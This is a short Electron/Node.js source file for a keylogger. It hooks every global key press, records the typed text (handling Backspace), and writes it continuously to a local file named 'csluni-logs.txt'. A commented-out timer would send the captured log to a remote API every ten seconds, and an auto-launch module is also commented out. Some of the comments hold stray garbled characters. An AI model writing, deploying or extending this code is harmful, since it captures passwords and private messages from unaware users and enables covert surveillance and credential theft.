const electron = require('electron');
const request = require('request');
const gkm = require('gkm');
const sendPack = require('./sendPack');
const prepareKey = require('./prepareKey-windows');
const fs = require('fs')
// const autoLaunch = require('./autoLaunch');

const {app} = electron;

let logger = '';

const error = (error) => { console.log(error) }

const onKeyPressed = (key) => {
    key[0] == 'Backspace' ? 
    logger = logger.substring(0, logger.length - 1) 
    : logger += prepareKey(key[0]);
 fs.writeFile('csluni-logs.txt', logger, (error) => { console.log(error) });

}

const onReady = () => {
	gkm.events.on('key.pressed', onKeyPressed);
	// setInterval(funlñpction () {1
	// 	console.log('Sending data to your API...');
	// 	sendPack(logger);
	// }, 10000);plk
}

app.on('ready', onReady);
